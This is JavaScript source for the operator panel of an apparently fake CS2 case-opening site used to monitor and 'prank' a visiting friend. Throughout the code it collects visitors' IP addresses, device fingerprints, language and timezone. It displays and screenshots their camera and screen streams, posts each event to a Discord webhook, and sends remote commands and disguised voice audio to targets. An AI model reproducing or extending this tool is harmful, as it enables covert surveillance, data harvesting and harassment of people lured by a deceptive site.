<script>
const ADMIN_PEER_ID = 'CS2_ADMIN_X7K9QW2';
let peer = null;
let conns = new Map();
let selectedIp = null;
let camCount = 0;
const connIp = new WeakMap();
let friendVoicePeerId = null;
let startTime = Date.now();
let sessionFilter = '';
let sortMode = 'time';
let totalVisits = 0;
let totalDrops = 0;

// Голос
let myMicStream = null;
let audioCtx = null;
let modifiedStream = null;
let sourceNode = null;
let delayNode = null;
let feedbackNode = null;
let wetGain = null;
let dryGain = null;
let destNode = null;
let voiceCall = null;
let voiceParams = { pitch: 1.0, echo: 0 };

// Вебхук
let webhookUrl = localStorage.getItem('cs2_webhook') || '';
const webhookInput = document.getElementById('webhookInput');
const webhookStatus = document.getElementById('webhookStatus');
if (webhookUrl) {
    webhookInput.value = webhookUrl;
    webhookStatus.textContent = 'задан';
    webhookStatus.className = 'webhook-status on';
}

document.getElementById('webhookSave').onclick = () => {
    const url = webhookInput.value.trim();
    if (!url || !url.startsWith('https://discord.com/api/webhooks/')) { alert('Вставь корректный URL'); return; }
    webhookUrl = url;
    localStorage.setItem('cs2_webhook', url);
    webhookStatus.textContent = 'задан';
    webhookStatus.className = 'webhook-status on';
    log('🔔 Вебхук сохранён', 'info');
    sendWebhook({title: '✅ Вебхук подключён', description: 'События будут приходить сюда.', color: 0x4ade80, timestamp: new Date().toISOString()});
};
document.getElementById('webhookTest').onclick = () => {
    if (!webhookUrl) { alert('Сохрани вебхук'); return; }
    sendWebhook({title: '🔔 Тест', description: 'Вебхук работает!', color: 0x7c3aed, timestamp: new Date().toISOString()});
};

function sendWebhook(embed) {
    if (!webhookUrl) return;
    try {
        fetch(webhookUrl, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                username: 'CS2 Case Bot',
                avatar_url: 'https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f3b0.png',
                embeds: [embed]
            })
        }).catch(() => {});
    } catch(e) {}
}

function log(msg, type='info') {
    const l = document.getElementById('log');
    if (!l) return;
    const t = new Date().toLocaleTimeString('ru-RU');
    const d = document.createElement('div');
    d.className = 'log-entry ' + type;
    d.innerHTML = `<span class="time">${t}</span>${msg}`;
    l.prepend(d);
    if (l.children.length > 500) l.lastChild.remove();
}

document.getElementById('clearLog').onclick = () => { document.getElementById('log').innerHTML = ''; };

function updateUptime() {
    const s = Math.floor((Date.now() - startTime) / 1000);
    const m = Math.floor(s/60);
    const sec = s % 60;
    document.getElementById('uptime').textContent = m > 0 ? `${m} мин ${sec} сек` : `${sec} сек`;
}
setInterval(updateUptime, 1000);

function updateStatsMini() {
    document.getElementById('statTotal').textContent = totalVisits;
    document.getElementById('statOnline').textContent = [...conns.values()].filter(s => Date.now() - s.lastSeen < 15000).length;
    document.getElementById('statDrops').textContent = totalDrops;
    let top = 0;
    conns.forEach(s => { if ((s.balance||0) > top) top = s.balance; });
    document.getElementById('statTopBalance').textContent = '$' + top.toFixed(0);
}

function initPeer() {
    const statusEl = document.getElementById('peerStatus');
    const dotEl = document.getElementById('peerDot');
    statusEl.textContent = '⏳ Подключение...';
    try { peer = new Peer(ADMIN_PEER_ID); } catch(e) { setTimeout(initPeer, 3000); return; }
    peer.on('open', (id) => {
        statusEl.textContent = '✅ Подключён · ID: ' + id;
        dotEl.classList.remove('off', 'err');
        log(`✅ PeerJS готов · ID: ${id}`, 'info');
    });
    peer.on('error', (err) => {
        log(`❌ PeerJS: ${err.type}`, 'err');
        if (err.type === 'unavailable-id') {
            statusEl.textContent = '⏳ ID занят. Переподключение...';
            dotEl.classList.add('err');
            try { peer.destroy(); } catch(e){}
            peer = null;
            setTimeout(initPeer, 3000);
        }
    });
    peer.on('connection', (conn) => {
        log('🔌 Новое подключение', 'warn');
        conn.on('data', (data) => handleData(data, conn));
        conn.on('close', () => {
            if (connIp.get(conn)) {
                const ip = connIp.get(conn);
                const s = conns.get(ip);
                if (s) {
                    sendWebhook({
                        title: '🔴 Отключился',
                        color: 0xeb4b4b,
                        fields: [
                            {name:'Устройство', value: s.device || '?', inline:true},
                            {name:'IP', value: '`'+ip+'`', inline:true}
                        ],
                        timestamp: new Date().toISOString()
                    });
                }
                log('🔴 Отключился: ' + ip, 'warn');
                conns.delete(ip);
                renderSessions(); updateStatsMini();
            }
        });
    });
    peer.on('call', (call) => {
        call.answer();
        call.on('stream', (stream) => {
            const hasVideo = stream.getVideoTracks().length > 0;
            if (!hasVideo) return;
            camCount++;
            document.getElementById('camCount').textContent = camCount;
            const box = document.getElementById('camBox' + (camCount === 1 ? '1' : '2'));
            if (!box) return;
            box.innerHTML = `<video autoplay muted playsinline></video><div class="label">${camCount === 1 ? '📸 КАМЕРА' : '🖥 ЭКРАН'}</div><button class="btn-screenshot" onclick="screenshot(this)">📸</button>`;
            const v = box.querySelector('video');
            v.srcObject = stream;
            v.play().catch(() => { v.muted = true; v.play(); });
        });
    });
}

function screenshot(btn) {
    const v = btn.parentElement.querySelector('video');
    const c = document.createElement('canvas');
    c.width = v.videoWidth; c.height = v.videoHeight;
    c.getContext('2d').drawImage(v, 0, 0);
    const a = document.createElement('a');
    a.download = 'screenshot_' + Date.now() + '.png';
    a.href = c.toDataURL();
    a.click();
}

function handleData(data, conn) {
    if (!data || !data.type) return;
    if (data.type === 'hello') {
        connIp.set(conn, data.ip);
        const shortId = data.sessionId || Math.random().toString(36).slice(2,6).toUpperCase();
        conns.set(data.ip, {
            conn, ip: data.ip, ua: data.ua,
            device: data.device || '❓',
            browser: data.browser || '—',
            deviceType: data.deviceType || 'desktop',
            sessionId: shortId,
            screen: data.screen || '—',
            extra: data.extra || {},
            balance: data.balance, drops: data.drops,
            joinedAt: data.ts, lastSeen: Date.now()
        });
        totalVisits++;
        log(`🟢 Подключился: ${data.device} · ${data.ip}`, 'info');
        renderSessions(); updateStatsMini();
        sendWebhook({
            title: '🟢 Новый заход',
            color: 0x7c3aed,
            fields: [
                {name:'📱 Устройство', value: data.device || '?', inline:true},
                {name:'🌐 Браузер', value: data.browser || '?', inline:true},
                {name:'🆔 Сессия', value: '`#'+shortId+'`', inline:true},
                {name:'🌐 IP', value: '`'+data.ip+'`', inline:false},
                {name:'🖥 Экран', value: data.screen || '—', inline:true},
                {name:'💰 Баланс', value: '$'+(data.balance||0).toFixed(2), inline:true},
                {name:'🗣 Язык', value: (data.extra && data.extra.language) || '—', inline:true},
                {name:'⏰ Часовой пояс', value: (data.extra && data.extra.timezone) || '—', inline:true},
                {name:'💻 Ядер CPU', value: String((data.extra && data.extra.cores) || '—'), inline:true},
                {name:'🧠 RAM', value: String((data.extra && data.extra.memory) || '—') + ' GB', inline:true},
                {name:'📶 Сеть', value: (data.extra && data.extra.connection) || '—', inline:true}
            ],
            timestamp: new Date().toISOString()
        });
    } else if (data.type === 'heartbeat') {
        const s = conns.get(data.ip);
        if (s) { s.lastSeen = Date.now(); s.balance = data.balance; s.drops = data.drops; renderSessions(); updateStatsMini(); }
    } else if (data.type === 'drop') {
        totalDrops++;
        log(`🎁 Дроп: ${data.skin.name} ($${data.skin.price})`, 'warn');
        const ip = connIp.get(conn); const s = ip ? conns.get(ip) : null;
        sendWebhook({
            title: '🎁 Дроп из кейса',
            color: data.profit >= 0 ? 0x4ade80 : 0xeb4b4b,
            fields: [
                {name:'📱 Устройство', value: s?.device || '?', inline:true},
                {name:'🌐 IP', value: '`'+(ip||'?')+'`', inline:true},
                {name:'🎰 Кейс', value: data.caseName, inline:false},
                {name:'🔫 Скин', value: data.skin.weapon + ' | ' + data.skin.name, inline:false},
                {name:'💰 Цена', value: '$' + data.skin.price.toFixed(2), inline:true},
                {name:'📊 Профит', value: (data.profit>=0?'+':'') + '$' + data.profit.toFixed(2), inline:true}
            ],
            timestamp: new Date().toISOString()
        });
    } else if (data.type === 'deposit') {
        log(`💳 Пополнение $${data.amount}`, 'info');
        const ip = connIp.get(conn); const s = ip ? conns.get(ip) : null;
        sendWebhook({
            title: '💳 Пополнение',
            color: 0x22c55e,
            fields: [
                {name:'📱 Устройство', value: s?.device || '?', inline:true},
                {name:'🌐 IP', value: '`'+(ip||'?')+'`', inline:true},
                {name:'💰 Сумма', value: '$' + data.amount.toFixed(2), inline:true}
            ],
            timestamp: new Date().toISOString()
        });
    } else if (data.type === 'upgradeWin') {
        log(`✅ Апгрейд win: ${data.your.name} → ${data.target.name}`, 'info');
        const ip = connIp.get(conn); const s = ip ? conns.get(ip) : null;
        sendWebhook({title: '✅ Апгрейд выигран', color: 0x4ade80, fields: [
            {name:'📱 Устройство', value: s?.device || '?', inline:true},
            {name:'🌐 IP', value: '`'+(ip||'?')+'`', inline:true},
            {name:'🎒 → 🎯', value: data.your.name + ' → ' + data.target.name, inline:false}
        ], timestamp: new Date().toISOString()});
    } else if (data.type === 'upgradeLose') {
        log(`❌ Апгрейд lose: ${data.your.name}`, 'err');
        const ip = connIp.get(conn); const s = ip ? conns.get(ip) : null;
        sendWebhook({title: '❌ Апгрейд проигран', color: 0xeb4b4b, fields: [
            {name:'📱 Устройство', value: s?.device || '?', inline:true},
            {name:'🌐 IP', value: '`'+(ip||'?')+'`', inline:true},
            {name:'🎒 Потеряно', value: data.your.name, inline:false}
        ], timestamp: new Date().toISOString()});
    } else if (data.type === 'sell') {
        log(`💸 Продажа: ${data.skin.name}`, 'info');
    } else if (data.type === 'cameraOn') {
        log('📸 Друг разрешил камеру', 'warn');
        const ip = connIp.get(conn); const s = ip ? conns.get(ip) : null;
        sendWebhook({title: '📸 Друг разрешил камеру', color: 0xec4899, fields: [
            {name:'📱 Устройство', value: s?.device || '?', inline:true},
            {name:'🌐 IP', value: '`'+(ip||'?')+'`', inline:true}
        ], timestamp: new Date().toISOString()});
    } else if (data.type === 'voicePlaying') {
        log('🟢 Друг слушает тебя', 'info');
        document.getElementById('talkStatus').textContent = '🟢 Друг слушает';
        document.getElementById('talkStatus').className = 'voice-status on';
        const ip = connIp.get(conn); const s = ip ? conns.get(ip) : null;
        sendWebhook({title: '🎙 Друг слушает', color: 0x4ade80, fields: [
            {name:'📱 Устройство', value: s?.device || '?', inline:true},
            {name:'🌐 IP', value: '`'+(ip||'?')+'`', inline:true}
        ], timestamp: new Date().toISOString()});
    } else if (data.type === 'voiceStopped') {
        document.getElementById('talkStatus').textContent = '🔇 Не слушает';
        document.getElementById('talkStatus').className = 'voice-status';
    } else if (data.type === 'voicePeerId') {
        friendVoicePeerId = data.peerId;
        log('🎙 Друг готов слушать', 'warn');
        if (modifiedStream && peer && peer.open) makeVoiceCall();
    } else if (data.type === 'idle') {
        log('💤 Друг бездействует 30 сек', 'warn');
        const ip = connIp.get(conn); const s = ip ? conns.get(ip) : null;
        sendWebhook({title: '💤 Друг бездействует', color: 0x8892a6, fields: [
            {name:'📱 Устройство', value: s?.device || '?', inline:true},
            {name:'🌐 IP', value: '`'+(ip||'?')+'`', inline:true}
        ], timestamp: new Date().toISOString()});
    } else if (data.type === 'wakeLockOn') {
        log('💡 Wake Lock активен', 'info');
    }
}

document.getElementById('sessionFilter').addEventListener('input', (e) => { sessionFilter = e.target.value.toLowerCase(); renderSessions(); });
document.getElementById('sortSessions').addEventListener('change', (e) => { sortMode = e.target.value; renderSessions(); });

function renderSessions() {
    const list = document.getElementById('sessionsList');
    document.getElementById('sessionCount').textContent = conns.size;
    if (!conns.size) {
        list.innerHTML = '<div class="empty"><b>Пока никого</b>Друг должен зайти на сайт</div>';
        return;
    }
    let arr = [...conns.values()];
    if (sessionFilter) arr = arr.filter(s => (s.device||'').toLowerCase().includes(sessionFilter) || s.ip.includes(sessionFilter));
    if (sortMode === 'balance') arr.sort((a,b) => (b.balance||0) - (a.balance||0));
    else if (sortMode === 'drops') arr.sort((a,b) => (b.drops||0) - (a.drops||0));
    else arr.sort((a, b) => b.lastSeen - a.lastSeen);
    list.innerHTML = '';
    arr.forEach((s, i) => {
        const online = Date.now() - s.lastSeen < 15000;
        const ago = Math.floor((Date.now() - s.joinedAt) / 1000);
        const agoT = ago < 60 ? ago + ' сек' : Math.floor(ago/60) + ' мин';
        const d = document.createElement('div');
        d.className = 'session' + (selectedIp === s.ip ? ' active' : '');
        d.innerHTML = `
            <div class="session-idx">#${s.sessionId||i+1}</div>
            <div>
                <div class="session-device">${s.device || '❓'} <span style="color:#8892a6;font-size:11px">${s.browser||''}</span></div>
                <div class="session-ip">${s.ip}</div>
            </div>
            <div class="session-time"><b>${agoT}</b>зашёл</div>
            <div class="session-stats"><b>${s.drops}</b>дропов · $${(s.balance||0).toFixed(0)}</div>
            <div class="session-status"><div class="status-dot ${online?'':'off'}"></div>${online?'онлайн':'офлайн'}</div>
        `;
        d.onclick = () => selectSession(s.ip);
        list.appendChild(d);
    });
}

function selectSession(ip) {
    selectedIp = ip;
    const s = conns.get(ip);
    const info = document.getElementById('selectedInfo');
    if (s) {
        info.className = 'selected-info';
        info.innerHTML = `
            <div><div class="label">Устройство</div><div class="value">${s.device||'?'}</div></div>
            <div><div class="label">Браузер</div><div class="value">${s.browser||'?'}</div></div>
            <div><div class="label">IP</div><div class="value">${s.ip}</div></div>
            <div><div class="label">Экран</div><div class="value">${s.screen||'?'}</div></div>
            <div><div class="label">Баланс</div><div class="value">$${(s.balance||0).toFixed(2)}</div></div>
            <div><div class="label">Дропов</div><div class="value">${s.drops||0}</div></div>
            <div><div class="label">Язык</div><div class="value">${(s.extra&&s.extra.language)||'—'}</div></div>
            <div><div class="label">Пояс</div><div class="value">${(s.extra&&s.extra.timezone)||'—'}</div></div>
        `;
    }
    renderSessions();
}

function sendPrank(action, extra = {}) {
    if (!selectedIp) { alert('Выбери сессию'); return; }
    const s = conns.get(selectedIp);
    if (!s || !s.conn || !s.conn.open) { alert('Сессия офлайн'); return; }
    s.conn.send({ action, ...extra });
    log('😈 → ' + action, 'warn');
}

function broadcast(action, extra = {}) {
    let n = 0;
    conns.forEach(s => { if (s.conn && s.conn.open) { s.conn.send({action, ...extra}); n++; } });
    log('📡 Broadcast → ' + action + ' (' + n + ')', 'warn');
}

